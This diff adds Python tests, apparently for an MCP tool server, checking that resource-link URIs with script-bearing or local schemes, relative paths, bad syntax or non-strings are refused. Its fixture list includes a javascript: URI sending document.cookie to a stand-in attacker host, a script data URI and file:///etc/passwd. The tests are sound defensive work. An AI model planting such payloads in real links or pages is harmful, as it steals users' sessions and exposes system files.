@@ -314,3 +314,73 @@ def test_resource_link_needs_no_mime_type() -> None:
         content_kind=ToolContentKind.RESOURCE_LINK,
     )
     assert binding.content_mime_type is None
+
+
+# ---------- a resource_link URI is untrusted, and reaches a host that renders it ----------
+
+
+def _link_result(uri: Any) -> dict[str, Any]:
+    server = _server()
+    server.register_service_tool(
+        name="bookmarks.find",
+        spec=ServiceSpec(service=lambda **_: [{"uri": uri, "name": "Saved link"}], atomic=False),
+        content_kind=ToolContentKind.RESOURCE_LINK,
+    )
+    return handle_tools_call({"name": "bookmarks.find", "arguments": {}}, _ctx(server))
+
+
+@pytest.mark.parametrize(
+    "uri",
+    [
+        'javascript:fetch("//evil.test/"+document.cookie)',
+        "data:text/html,<script>alert(1)</script>",
+        "vbscript:msgbox(1)",
+        "blob:https://example.test/9e1f",
+        "file:///etc/passwd",
+        "about:config",
+    ],
+)
+def test_a_script_bearing_resource_link_scheme_is_refused(uri: str) -> None:
+    """The payload field holding a URI is usually a value some end user stored.
+
+    A bookmarks or attachments table is readable by one user and writable by
+    another; emitting the row verbatim hands an MCP host a link it may render as
+    a clickable anchor in its own origin, or fetch to build a preview.
+    """
+    result = _link_result(uri)
+    assert result["isError"] is True
+    assert "content_kind=RESOURCE_LINK" in result["content"][0]["text"]
+
+
+def test_a_relative_resource_link_uri_is_refused() -> None:
+    result = _link_result("/invoices/1")
+    assert result["isError"] is True
+    assert "absolute URI" in result["content"][0]["text"]
+
+
+def test_an_unparseable_resource_link_uri_is_refused() -> None:
+    # ``urlsplit`` raises on an unclosed IPv6 literal; unparseable is unlinkable.
+    result = _link_result("http://[::1")
+    assert result["isError"] is True
+    assert "absolute URI" in result["content"][0]["text"]
+
+
+def test_a_non_string_resource_link_uri_is_refused() -> None:
+    result = _link_result(42)
+    assert result["isError"] is True
+    assert "not a string" in result["content"][0]["text"]
+
+
+@pytest.mark.parametrize(
+    "uri",
+    ["https://example.test/doc", "http://localhost:8000/doc", "reports://q3", "ui://widget/x"],
+)
+def test_ordinary_and_server_registered_schemes_still_pass(uri: str) -> None:
+    """An allowlist would have to enumerate every scheme a server registers.
+
+    ``build_content_blocks`` cannot see the resource registry, so refusing an
+    unknown scheme would break the ordinary case to guard against nothing.
+    """
+    result = _link_result(uri)
+    assert "isError" not in result
+    assert result["content"][0]["uri"] == uri
